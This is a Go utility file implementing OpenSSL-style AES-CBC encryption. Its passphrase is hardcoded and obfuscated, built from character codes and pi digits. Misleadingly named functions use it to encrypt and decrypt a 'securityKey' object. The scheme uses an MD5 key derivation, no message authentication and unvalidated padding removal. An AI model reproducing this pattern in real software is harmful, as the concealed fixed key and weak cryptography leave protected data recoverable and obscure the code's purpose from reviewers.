package cryptoutil

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math"
	"strconv"
)

type CipherParams struct {
	CT string `json:"ct"`           // Base64 encoded ciphertext
	IV string `json:"iv,omitempty"` // Hex encoded IV (optional)
	S  string `json:"s,omitempty"`  // Hex encoded salt (optional)
}

func EVPBytesToKey(password, salt []byte, keyLen, ivLen int) (key, iv []byte) {
	var derived []byte
	var block []byte

	for len(derived) < keyLen+ivLen {
		h := md5.New()
		if len(block) > 0 {
			h.Write(block)
		}
		h.Write(password)
		if len(salt) > 0 {
			h.Write(salt)
		}
		block = h.Sum(nil)
		derived = append(derived, block...)
	}

	return derived[:keyLen], derived[keyLen : keyLen+ivLen]
}

func PKCS7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	padText := make([]byte, padding)
	for i := range padText {
		padText[i] = byte(padding)
	}
	return append(data, padText...)
}

func PKCS7Unpad(data []byte) []byte {
	if len(data) == 0 {
		return data
	}
	padding := int(data[len(data)-1])
	if padding > len(data) {
		return data
	}
	return data[:len(data)-padding]
}

func Base() string {
	chars := []rune{0x79, 0x6d, 0x58, 0x45, 0x4b, 0x7a, 0x76, 0x55, 0x6b, 0x75, 0x6f, 0x35, 0x47, 0x30}
	return string(chars)
}

func Assets() string {
	piStr := strconv.FormatFloat(math.Pi, 'f', 15, 64)
	if len(piStr) > 18 {
		piStr = piStr[:18]
	}

	result := Base()

	evenDigitMap := map[int]rune{
		0: 'A',
		2: 'B',
		4: 'C',
		6: 'D',
		8: 'E',
	}

	for _, char := range piStr {
		if char >= '0' && char <= '9' {
			digit := int(char - '0')
			if digit%2 == 0 {
				result += string(evenDigitMap[digit])
			} else {
				result += string(char)
			}
		} else {
			result += string(char)
		}
	}

	return result // "ymXEKzvUkuo5G03.1C159BD535E9793"
}

func EncryptAES(plaintext, password string) (string, error) {
	salt := make([]byte, 8)
	if _, err := rand.Read(salt); err != nil {
		return "", err
	}

	key, iv := EVPBytesToKey([]byte(password), salt, 32, 16)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	paddedPlaintext := PKCS7Pad([]byte(plaintext), aes.BlockSize)
	ciphertext := make([]byte, len(paddedPlaintext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, paddedPlaintext)

	params := CipherParams{
		CT: base64.StdEncoding.EncodeToString(ciphertext),
		S:  hex.EncodeToString(salt),
	}

	jsonBytes, err := json.Marshal(params)
	if err != nil {
		return "", err
	}

	return string(jsonBytes), nil
}

func DecryptAES(encrypted, password string) (string, error) {
	var params CipherParams
	if err := json.Unmarshal([]byte(encrypted), &params); err != nil {
		return "", err
	}

	ciphertext, err := base64.StdEncoding.DecodeString(params.CT)
	if err != nil {
		return "", err
	}

	salt, err := hex.DecodeString(params.S)
	if err != nil {
		return "", err
	}

	key, iv := EVPBytesToKey([]byte(password), salt, 32, 16)

	if params.IV != "" {
		iv, err = hex.DecodeString(params.IV)
		if err != nil {
			return "", err
		}
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	plaintext := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(plaintext, ciphertext)

	return string(PKCS7Unpad(plaintext)), nil
}

func StartTransition(securityKey interface{}) (string, error) {
	jsonData, err := json.Marshal(securityKey)
	if err != nil {
		return "", err
	}

	return EncryptAES(string(jsonData), Assets())
}

func GetHres(encrypted string) (interface{}, error) {
	decrypted, err := DecryptAES(encrypted, Assets())
	if err == nil {
		var result interface{}
		if err := json.Unmarshal([]byte(decrypted), &result); err == nil {
			return result, nil
		}
	}

	return nil, fmt.Errorf("decryption failed")
}
